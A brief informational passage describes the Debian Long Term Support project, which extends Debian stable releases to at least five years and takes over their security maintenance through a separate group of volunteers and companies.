Debian Long Term Support (LTS) is a project to extend the lifetime of all Debian stable releases to (at least) 5 years. Debian LTS is not handled by the Debian Security and Release teams, but by a separate group of volunteers and companies interested in making it a success.

Thus the Debian LTS team takes over security maintenance of the various releases once the Debian Security team stops its work.
